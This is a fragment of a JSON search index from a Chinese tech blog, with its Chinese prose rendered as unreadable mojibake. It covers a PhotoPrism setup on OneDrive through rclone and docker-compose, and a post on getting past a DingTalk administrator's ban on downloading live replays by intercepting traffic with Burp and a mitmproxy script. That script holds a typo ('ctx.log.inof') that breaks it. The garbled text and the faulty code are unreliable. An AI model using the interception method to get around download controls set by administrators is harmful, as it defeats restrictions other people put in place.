style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eå°†æœ€åä¸€ä¸ª else çš„è¾“å‡ºé‡å®šå‘å»é™¤ï¼Œæ­¤æ—¶æˆ‘ä»¬å†è¿è¡Œ wps å°±æœ‰æŠ¥é”™è¾“å‡ºäº†\u003c/p\u003e","title":"docker ä¸­ä½¿ç”¨ pywpsrpc"},{"content":"vpsç©ºé—´å°ï¼Œæ‰€ä»¥ä½¿ç”¨onedriveä¸ºä¾‹ä½œä¸ºå­˜å‚¨æ¥æ­å»º photoprism\nä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š\nä½¿ç”¨rcloneæŒ‚è½½onedrive éƒ¨ç½²photoprism è·å¾—rclone.conf é¦–å…ˆåœ¨æœ¬åœ°ç”µè„‘ä¸Šå®‰è£…rclone\nç„¶åè¿è¡Œ rclone config\nå‚ç…§ https://rclone.org/onedrive/ è¿›è¡Œè¿œç¨‹é…ç½®\nç„¶åé…ç½®å®Œæˆåï¼Œ~/.config/rclone/rclone.conf å†…å®¹ç±»ä¼¼\n1 2 3 4 5 [onedrive] type = myonedrive token = {\u0026#34;access_token\u0026#34;:\u0026#34;EwCAA8l6BA1\u0026#34;,\u0026#34;token_type\u0026#34;:\u0026#34;Bearer\u0026#34;,\u0026#34;refresh_token\u0026#34;:\u0026#34;M.C106eExJ7edYrxNdb3\u0026#34;,\u0026#34;expiry\u0026#34;:\u0026#34;2023-06-03T16:20:11.7705715+08:00\u0026#34;} drive_id = 19fe142286d457 drive_type = personal docker plugin rcloneé…ç½® å¯æŒ‰ç…§ä¸‹é¢ï¼Œæˆ–è€…å‚è§ https://rclone.org/docker/\né¦–å…ˆåˆ›å»ºä¸¤ä¸ªæ–‡ä»¶å¤¹\n1 2 sudo mkdir -p /var/lib/docker-plugins/rclone/config sudo mkdir -p /var/lib/docker-plugins/rclone/cache ç„¶åå®‰è£… docker æ’ä»¶ rclone\n1 docker plugin install rclone/docker-volume-rclone:latest args=\u0026#34;-v\u0026#34; --alias rclone --grant-all-permissions ç„¶åå°†ä¸Šé¢åœ¨æœ¬åœ°ç”µè„‘ä¸Šç”Ÿæˆçš„ rclone.conf å†…å®¹æ‹·è´åˆ° vps çš„ /var/lib/docker-plugins/rclone/config/rclone.conf æ–‡ä»¶ä¸­\néƒ¨ç½² photoprism docker-compose.yml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 version: \u0026#39;3.5\u0026#39; # Example Docker Compose config file for PhotoPrism (Linux / AMD64) # # Note: # - Running PhotoPrism on a server with less than 4 GB of swap space or setting a memory/swap limit can cause unexpected # restarts (\u0026#34;crashes\u0026#34;), for example, when the indexer temporarily needs more memory to process large files. # - If you install PhotoPrism on a public server outside your home network, please always run it behind a secure # HTTPS reverse proxy such as Traefik or Caddy. Your files and passwords will otherwise be transmitted # in clear text and can be intercepted by anyone, including your provider, hackers, and governments: # https://docs.photoprism.app/getting-started/proxies/traefik/ # # Setup Guides: # - https://docs.photoprism.app/getting-started/docker-compose/ # - https://docs.photoprism.app/getting-started/raspberry-pi/ # - https://www.photoprism.app/kb/activation # # Troubleshooting Checklists: # - https://docs.photoprism.app/getting-started/troubleshooting/ # - https://docs.photoprism.app/getting-started/troubleshooting/docker/ # - https://docs.photoprism.app/getting-started/troubleshooting/mariadb/ # # CLI Commands: # - https://docs.photoprism.app/getting-started/docker-compose/#command-line-interface # # All commands may have to be prefixed with \u0026#34;sudo\u0026#34; when not running as root. # This will point the home directory shortcut ~ to /root in volume mounts. services: photoprism: ## Use photoprism/photoprism:preview for testing preview builds: image: photoprism/photoprism:preview container_name: photoprism ## Don\u0026#39;t enable automatic restarts until PhotoPrism has been properly configured and tested! ## If the service gets stuck in a restart loop, this points to a memory, filesystem, network, or database issue: ## https://docs.photoprism.app/getting-started/troubleshooting/#fatal-server-errors # restart: unless-stopped stop_grace_period: 10s security_opt: - seccomp:unconfined - apparmor:unconfined ports: - \u0026#34;12342:2342\u0026#34; # HTTP port (host:container) environment: PHOTOPRISM_ADMIN_USER: \u0026#34;admin\u0026#34; # ç®¡ç†å‘˜ç™»é™†ç”¨æˆ·å PHOTOPRISM_ADMIN_PASSWORD: \u0026#34;å¯†ç \u0026#34; # ç®¡ç†å‘˜å¯†ç  PHOTOPRISM_AUTH_MODE: \u0026#34;password\u0026#34; # authentication mode (public, password) PHOTOPRISM_SITE_URL: \u0026#34;http://photoprism.me:12342/\u0026#34; # æœåŠ¡å™¨urlï¼Œæ ¼å¼ï¼š \u0026#34;http(s)://domain.name(:port)/(path)\u0026#34; PHOTOPRISM_ORIGINALS_LIMIT: 5000 # æ–‡ä»¶å¤§å°é™åˆ¶ MB (increase for high-res video) PHOTOPRISM_HTTP_COMPRESSION: \u0026#34;gzip\u0026#34; # improves transfer speed and bandwidth utilization (none or gzip) PHOTOPRISM_LOG_LEVEL: \u0026#34;info\u0026#34; # æ—¥å¿—ç­‰çº§: trace, debug, info, warning, error, fatal, or panic PHOTOPRISM_READONLY: \u0026#34;false\u0026#34; # do not modify originals directory (reduced functionality) PHOTOPRISM_EXPERIMENTAL: \u0026#34;true\u0026#34; # enables experimental features PHOTOPRISM_DISABLE_CHOWN: \u0026#34;false\u0026#34; # disables updating storage permissions via chmod and chown on startup PHOTOPRISM_DISABLE_WEBDAV: \u0026#34;false\u0026#34; # disables built-in WebDAV server PHOTOPRISM_DISABLE_SETTINGS: \u0026#34;false\u0026#34; # disables settings UI and API PHOTOPRISM_DISABLE_TENSORFLOW: \u0026#34;false\u0026#34; # disables all features depending on TensorFlow PHOTOPRISM_DISABLE_FACES: \u0026#34;false\u0026#34; # disables face detection and recognition (requires TensorFlow) PHOTOPRISM_DISABLE_CLASSIFICATION: \u0026#34;false\u0026#34; # disables image classification (requires TensorFlow) PHOTOPRISM_DISABLE_VECTORS: \u0026#34;false\u0026#34; # disables vector graphics support PHOTOPRISM_DISABLE_RAW: \u0026#34;false\u0026#34; # disables indexing and conversion of RAW images PHOTOPRISM_RAW_PRESETS: \u0026#34;false\u0026#34; # enables applying user presets when converting RAW images (reduces performance) PHOTOPRISM_JPEG_QUALITY: 85 # a higher value increases the quality and file size of JPEG images and thumbnails (25-100) PHOTOPRISM_DETECT_NSFW: \u0026#34;false\u0026#34; # automatically flags photos as private that MAY be offensive (requires TensorFlow) PHOTOPRISM_UPLOAD_NSFW: \u0026#34;true\u0026#34; # allows uploads that MAY be offensive (no effect without TensorFlow) PHOTOPRISM_DATABASE_DRIVER: \u0026#34;sqlite\u0026#34; # SQLite is an embedded database that doesn\u0026#39;t require a server PHOTOPRISM_SITE_CAPTION: \u0026#34;\u0026#34; PHOTOPRISM_SITE_DESCRIPTION: \u0026#34;\u0026#34; # meta site description PHOTOPRISM_SITE_AUTHOR: \u0026#34;\u0026#34; # meta site author ## Run/install on first startup (options: update https gpu tensorflow davfs clitools clean): # PHOTOPRISM_INIT: \u0026#34;https gpu tensorflow\u0026#34; ## Hardware Video Transcoding: # PHOTOPRISM_FFMPEG_ENCODER: \u0026#34;software\u0026#34; # FFmpeg encoder (\u0026#34;software\u0026#34;, \u0026#34;intel\u0026#34;, \u0026#34;nvidia\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;raspberry\u0026#34;) # PHOTOPRISM_FFMPEG_BITRATE: \u0026#34;32\u0026#34; # FFmpeg encoding bitrate limit in Mbit/s (default: 50) ## Run as a non-root user after initialization (supported: 0, 33, 50-99, 500-600, and 900-1200): # PHOTOPRISM_UID: 1000 # PHOTOPRISM_GID: 1000 # PHOTOPRISM_UMASK: 0000 ## Start as non-root user before initialization (supported: 0, 33, 50-99, 500-600, and 900-1200): # user: \u0026#34;1000:1000\u0026#34; ## Share hardware devices with FFmpeg and TensorFlow (optional): # devices: # - \u0026#34;/dev/dri:/dev/dri\u0026#34; # Intel QSV # - \u0026#34;/dev/nvidia0:/dev/nvidia0\u0026#34; # Nvidia CUDA # - \u0026#34;/dev/nvidiactl:/dev/nvidiactl\u0026#34; # - \u0026#34;/dev/nvidia-modeset:/dev/nvidia-modeset\u0026#34; # - \u0026#34;/dev/nvidia-nvswitchctl:/dev/nvidia-nvswitchctl\u0026#34; # - \u0026#34;/dev/nvidia-uvm:/dev/nvidia-uvm\u0026#34; # - \u0026#34;/dev/nvidia-uvm-tools:/dev/nvidia-uvm-tools\u0026#34; # - \u0026#34;/dev/video11:/dev/video11\u0026#34; # Video4Linux Video Encode Device (h264_v4l2m2m) working_dir: \u0026#34;/photoprism\u0026#34; # do not change or remove ## Storage Folders: \u0026#34;~\u0026#34; is a shortcut for your home directory, \u0026#34;.\u0026#34; for the current directory volumes: # \u0026#34;/host/folder:/photoprism/folder\u0026#34; # Example - \u0026#34;onedrive_photos:/photoprism/originals\u0026#34; # Original media files (DO NOT REMOVE) # - \u0026#34;/example/family:/photoprism/originals/family\u0026#34; # *Additional* media folders can be mounted like this # - \u0026#34;photoprism_import:/photoprism/import\u0026#34; # *Optional* base folder from which files can be imported to originals - \u0026#34;./storage:/photoprism/storage\u0026#34; # *Writable* storage folder for cache, database, and sidecar files (DO NOT REMOVE) ## Watchtower upgrades services automatically (optional) ## see https://docs.photoprism.app/getting-started/updates/#watchtower ## activate via \u0026#34;COMPOSE_PROFILES=update docker compose up -d\u0026#34; watchtower: restart: unless-stopped image: containrrr/watchtower profiles: [\u0026#34;update\u0026#34;] environment: WATCHTOWER_CLEANUP: \u0026#34;true\u0026#34; WATCHTOWER_POLL_INTERVAL: 7200 # checks for updates every two hours volumes: - \u0026#34;/var/run/docker.sock:/var/run/docker.sock\u0026#34; - \u0026#34;~/.docker/config.json:/config.json\u0026#34; # optional, for authentication if you have a Docker Hub account volumes: #å‚¨å­˜å·é…ç½®ï¼š onedrive_photos: #å·å onedrive_photos driver: rclone #ç£ç›˜å rclone driver_opts: #ç£ç›˜é…ç½® remote: onedrive:/å›¾ç‰‡/æœ¬æœºç…§ç‰‡ #åŒæ­¥ onedrive ä¸‹ /å›¾ç‰‡/æœ¬æœºç…§ç‰‡ æ–‡ä»¶ allow_other: \u0026#39;true\u0026#39; #ç±»ä¼¼rclone mounté…ç½® vfs_cache_mode: full #ç±»ä¼¼rclone mounté…ç½® å¦‚æœä½ ä¸éœ€è¦è‡ªåŠ¨æ›´æ–°photoprismç‰ˆæœ¬ï¼Œä½ å¯ä»¥å»é™¤ watchtower çš„å®¹å™¨\nä¸€èˆ¬onedriveé»˜è®¤æƒ…å†µä¸‹å¤‡ä»½ç›¸å†Œç…§ç‰‡åˆ° /å›¾ç‰‡/æœ¬æœºç…§ç‰‡ ï¼Œå¦‚æœä½ æœ‰æ›´æ”¹è¿‡ï¼Œå¯ä»¥æ¢æˆä½ æ›´æ”¹çš„æ–‡ä»¶å¤¹è·¯å¾„\nç„¶åä½¿ç”¨ docker compose up -d å¯åŠ¨\nè®¿é—®åœ¨ docker-compose.yml ä¸­å®šä¹‰çš„æœåŠ¡å™¨urlå³å¯\nä¸Šä¼ å›¾ç‰‡çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ photosyncï¼ˆå®˜æ–¹æ¨èï¼‰ æˆ–è€…ä½¿ç”¨ syncthingï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨ onedrive çš„åŒæ­¥åŠŸèƒ½\nphotosyncæ˜¯é€šè¿‡webdavåŠŸèƒ½æ¥åŒæ­¥ï¼Œphotoprismåªæœ‰å½“ä½¿ç”¨webdavåŒæ­¥æ—¶æ‰ä¼šè§¦å‘ç´¢å¼•ï¼Œæ‰€ä»¥syncthingæˆ–onedriveçš„åŒæ­¥éƒ½æ²¡æ³•è‡ªåŠ¨ç´¢å¼•\næ‰€ä»¥éœ€è¦æ‰‹åŠ¨ä½¿ç”¨å‘½ä»¤è¿›è¡Œè§¦å‘ï¼Œå¯ä»¥ä½¿ç”¨ crontab æ¥å®šæ—¶åŒæ­¥\n1 2 3 crontab -e # è®¾ç½®æ¯å¤©æ™šä¸Š1ç‚¹è‡ªåŠ¨å¯¼å…¥ 0 1 * * * /usr/bin/docker exec photoprism photoprism index æˆ–è€…ä½ å¯ä»¥ä½¿ç”¨ syncthing + https://github.com/signalkraft/photoprism-syncthing-indexer æ¥è‡ªåŠ¨ç´¢å¼•\nå‚è€ƒ è‡ªå»ºäº‘ç›¸å†ŒPhotoPrism\nDocker Volume Plugin\nåœ¨Dockerä¸­ä½¿ç”¨Rcloneä½œä¸ºå‚¨å­˜å·\nMicrosoft OneDrive\nSyncthing and photoprism\n","permalink":"https://www.hacktech.cn/post/2023-06-04-photoprism-rclone%E6%90%AD%E5%BB%BA.html","summary":"\u003cp\u003evpsç©ºé—´å°ï¼Œæ‰€ä»¥ä½¿ç”¨onedriveä¸ºä¾‹ä½œä¸ºå­˜å‚¨æ¥æ­å»º photoprism\u003c/p\u003e\n\u003cp\u003eä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eä½¿ç”¨rcloneæŒ‚è½½onedrive\u003c/li\u003e\n\u003cli\u003eéƒ¨ç½²photoprism\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"è·å¾—rcloneconf\"\u003eè·å¾—rclone.conf\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆåœ¨æœ¬åœ°ç”µè„‘ä¸Šå®‰è£…rclone\u003c/p\u003e\n\u003cp\u003eç„¶åè¿è¡Œ \u003ccode\u003erclone config\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eå‚ç…§ \u003ca href=\"https://rclone.org/onedrive/\"\u003ehttps://rclone.org/onedrive/\u003c/a\u003e è¿›è¡Œè¿œç¨‹é…ç½®\u003c/p\u003e\n\u003cp\u003eç„¶åé…ç½®å®Œæˆåï¼Œ\u003ccode\u003e~/.config/rclone/rclone.conf\u003c/code\u003e å†…å®¹ç±»ä¼¼\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e5\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e[onedrive]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etype = myonedrive\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etoken = {\u0026#34;access_token\u0026#34;:\u0026#34;EwCAA8l6BA1\u0026#34;,\u0026#34;token_type\u0026#34;:\u0026#34;Bearer\u0026#34;,\u0026#34;refresh_token\u0026#34;:\u0026#34;M.C106eExJ7edYrxNdb3\u0026#34;,\u0026#34;expiry\u0026#34;:\u0026#34;2023-06-03T16:20:11.7705715+08:00\u0026#34;}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edrive_id = 19fe142286d457\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edrive_type = personal\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003ch2 id=\"docker-plugin-rcloneé…ç½®\"\u003edocker plugin rcloneé…ç½®\u003c/h2\u003e\n\u003cp\u003eå¯æŒ‰ç…§ä¸‹é¢ï¼Œæˆ–è€…å‚è§ \u003ca href=\"https://rclone.org/docker/\"\u003ehttps://rclone.org/docker/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆåˆ›å»ºä¸¤ä¸ªæ–‡ä»¶å¤¹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo mkdir -p /var/lib/docker-plugins/rclone/config\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo mkdir -p /var/lib/docker-plugins/rclone/cache\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eç„¶åå®‰è£… docker æ’ä»¶ rclone\u003c/p\u003e","title":"photoprism+rcloneæ­å»º"},{"content":" æ›´æ–° 20230221\nç°åœ¨æŠ“åŒ…å·²ç»æŠ“ä¸åˆ°è¿™ä¸ªé“¾æ¥äº†ï¼Œä¸è¿‡åœ¨æ‰“å¼€å›æ”¾æ—¶ä¼šæœ‰ä¸€ä¸ªè¯·æ±‚ /group-live-share/index.htm?liveUuid=xxx\næŠŠè¿™ä¸ªè¯·æ±‚æ‹¼æ¥ä¸Šå»åˆ°ä¸‹é¢çš„é“¾æ¥ä¾æ—§å¯ä»¥æ‰“å¼€ç½‘é¡µç‰ˆ\nä¸è¿‡è·å–åˆ°çš„ m3u8 é“¾æ¥ä¾æ—§æ˜¯æ— æ³•ç›´æ¥ä¸‹è½½çš„\nå†™äº†ä¸ªè„šæœ¬æ¥è‡ªåŠ¨åŒ–è¯¥æµç¨‹ï¼Œå¯åœ¨ https://github.com/akkuman/ding_playback_downloader è·å–\nåŸå§‹è®°å½• 20220907\næƒ³ä¸‹è½½é’‰é’‰ç›´æ’­å›æ”¾ï¼Œç®¡ç†å‘˜è®¾ç½®äº†ç¦æ­¢ä¸‹è½½\næ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« \n[[åŸåˆ›]é’‰é’‰å¦‚ä½•ä¸‹è½½ç®¡ç†å‘˜ç¦æ­¢çš„ç›´æ’­å›æ”¾(æŠ“åŒ…åˆ†æ)-è½¯ä»¶é€†å‘-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com](https://bbs.pediy.com/thread-274002.htm)\næ‰“å¼€burpï¼Œé…ç½®å¥½burpè¯ä¹¦ï¼Œç„¶åä½¿ç”¨proxifierå°†é’‰é’‰ä¸»ç¨‹åº DingTalk.exe çš„æµé‡å…¨éƒ¨è½¬å‘åˆ° burp ä»£ç†ç«¯å£ã€‚æ‰“å¼€ç›´æ’­å›æ”¾ï¼Œç‚¹å¼€ç›´æ’­\næŒ‰ç…§æ–‡ç« ä¸­çš„å¯»æ‰¾ï¼Œåªæ‰¾åˆ°äº†ä¸‹é¢è¿™ä¸ªé“¾æ¥\nè§£ç å‡ºæ¥è·å–åˆ°äº†\nå…¶ä¸­æœ‰ä¸ª publicLandingUrl https://h5.dingtalk.com/group-live-share/index.htm?type=2\u0026amp;liveFromType=6\u0026amp;liveUuid=xxxx\u0026amp;bizType=dingtalk\u0026amp;dd_nav_bgcolor=FF2C2D2F#/union\næµè§ˆå™¨æ‰“å¼€è¿™ä¸ªé“¾æ¥ï¼Œå¯ä»¥çœ‹åˆ°ç›´æ’­å›æ”¾\næ’­æ”¾è§†é¢‘ï¼Œæ‰“å¼€f12è¿›è¡ŒæŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªé“¾æ¥\nhttps://dtliving-sh.dingtalk.com/live_hp/xxxx_merge.m3u8?auth_key=xxxxxx\nè¿™ä¸ªé“¾æ¥ä¸­ï¼Œxxxxæ˜¯ä¸Šé¢liveUuidï¼Œç„¶åä¼šçœ‹åˆ°ä¸€ä¸ªm3u8ï¼Œç„¶åä½¿ç”¨å…¶ä»–çš„å·¥å…·ä¸‹è½½å¹¶åˆå¹¶m3u8å³å¯\nå…¶å®ä¸Šé¢çš„jsonä¸­çš„ liveUrlHls ****ä¸­çš„auth_keyå¯ä»¥ç”¨åœ¨æ‹¼æ¥m3u8é“¾æ¥ä¸Šï¼Œä½†æ˜¯å‘ç°ä¸‹è½½ liveUrlHls éœ€è¦å•ç‚¹ç™»å½•ï¼ˆä¸çŸ¥é“è¿™æ˜¯ä¸æ˜¯æˆ‘ä»¬å…¬å¸çš„é…ç½®ï¼‰ï¼Œè€Œä¸‹è½½ä¸Šé¢m3u8é“¾æ¥éœ€è¦ç½‘é¡µç™»å½•åcookieä¸­PC_SESSIONå€¼\næ‰€ä»¥è¿˜æ˜¯ç›´æ¥æ‰“å¼€ç½‘é¡µåä½¿ç”¨idmä¹‹ç±»çš„è½¯ä»¶è¿›è¡Œä¸‹è½½å§ã€‚\nç»™å‡ºä¸€ä»½mitmproxyçš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 from mitmproxy import http from mitmproxy import ctx import re import json pattern = re.compile(r\u0026#39;\\[live\\-playback\\-room\\].+?\\[response\\](\\{.+\\})\u0026#39;) def request(flow: http.HTTPFlow) -\u0026gt; None: # if flow.request.pretty_host != \u0026#39;retcode.taobao.com\u0026#39;: # return if not flow.request.path.startswith(\u0026#39;/r.png\u0026#39;): return msg = flow.request.query.get(\u0026#39;msg\u0026#39;) if not msg: return if not pattern.match(msg): return data = pattern.search(msg)[1] try: data = json.loads(data) except Exception: return live_info = data.get(\u0026#39;liveInfo\u0026#39;) if not live_info: return live_uuid = live_info.get(\u0026#39;liveUuid\u0026#39;) ctx.log.info(f\u0026#39;è·å–åˆ° liveUuid {live_uuid}\u0026#39;) live_url_hls = live_info.get(\u0026#39;liveUrlHls\u0026#39;) ctx.log.info(f\u0026#39;è·å–åˆ° liveUrlHls {live_url_hls}\u0026#39;) ctx.log.inof(f\u0026#34;è¯·æ‰“å¼€ç½‘é¡µä½¿ç”¨IDMè¿›è¡Œä¸‹è½½: {live_info.get(\u0026#39;publicLandingUrl\u0026#39;)}\u0026#34;) è‡ªåŠ¨åŒ–çš„æ–¹æ¡ˆï¼Œä¹‹åå†èŠ±æ—¶é—´ç ”ç©¶\n","permalink":"https://www.hacktech.cn/post/2023-02-21-%E9%92%89%E9%92%89%E7%9B%B4%E6%92%AD%E5%9B%9E%E6%94%BE%E4%B8%8B%E8%BD%BD.html","summary":"\u003chr\u003e\n\u003cp\u003eæ›´æ–° 20230221\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003eç°åœ¨æŠ“åŒ…å·²ç»æŠ“ä¸åˆ°è¿™ä¸ªé“¾æ¥äº†ï¼Œä¸è¿‡åœ¨æ‰“å¼€å›æ”¾æ—¶ä¼šæœ‰ä¸€ä¸ªè¯·æ±‚ \u003ccode\u003e/group-live-share/index.htm?liveUuid=xxx\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eæŠŠè¿™ä¸ªè¯·æ±‚æ‹¼æ¥ä¸Šå»åˆ°ä¸‹é¢çš„é“¾æ¥ä¾æ—§å¯ä»¥æ‰“å¼€ç½‘é¡µç‰ˆ\u003c/p\u003e\n\u003cp\u003eä¸è¿‡è·å–åˆ°çš„ m3u8 é“¾æ¥ä¾æ—§æ˜¯æ— æ³•ç›´æ¥ä¸‹è½½çš„\u003c/p\u003e\n\u003cp\u003eå†™äº†ä¸ªè„šæœ¬æ¥è‡ªåŠ¨åŒ–è¯¥æµç¨‹ï¼Œå¯åœ¨ \u003ca href=\"https://github.com/akkuman/ding_playback_downloader\"\u003ehttps://github.com/akkuman/ding_playback_downloader\u003c/a\u003e è·å–\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003eåŸå§‹è®°å½• 20220907\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003eæƒ³ä¸‹è½½é’‰é’‰ç›´æ’­å›æ”¾ï¼Œç®¡ç†å‘˜è®¾ç½®äº†ç¦æ­¢ä¸‹è½½\u003c/p\u003e\n\u003cp\u003eæ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« \u003c/p\u003e\n\u003cp\u003e[[åŸåˆ›]é’‰é’‰å¦‚ä½•ä¸‹è½½ç®¡ç†å‘˜ç¦æ­¢çš„ç›´æ’­å›æ”¾(æŠ“åŒ…åˆ†æ)-è½¯ä»¶é€†å‘-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com](\u003ca href=\"https://bbs.pediy.com/thread-274002.htm\"\u003ehttps://bbs.pediy.com/thread-274002.htm\u003c/a\u003e)\u003c/p\u003e\n\u003cp\u003eæ‰“å¼€burpï¼Œé…ç½®å¥½burpè¯ä¹¦ï¼Œç„¶åä½¿ç”¨proxifierå°†é’‰é’‰ä¸»ç¨‹åº DingTalk.exe çš„æµé‡å…¨éƒ¨è½¬å‘åˆ° burp ä»£ç†ç«¯å£ã€‚æ‰“å¼€ç›´æ’­å›æ”¾ï¼Œç‚¹å¼€ç›´æ’­\u003c/p\u003e\n\u003cp\u003eæŒ‰ç…§æ–‡ç« ä¸­çš„å¯»æ‰¾ï¼Œåªæ‰¾åˆ°äº†ä¸‹é¢è¿™ä¸ªé“¾æ¥\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/images/uploads/untitled.png\" alt=\"\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eè§£ç å‡ºæ¥è·å–åˆ°äº†\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/images/uploads/untitled-1.png\" alt=\"Untitled\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eå…¶ä¸­æœ‰ä¸ª publicLandingUrl 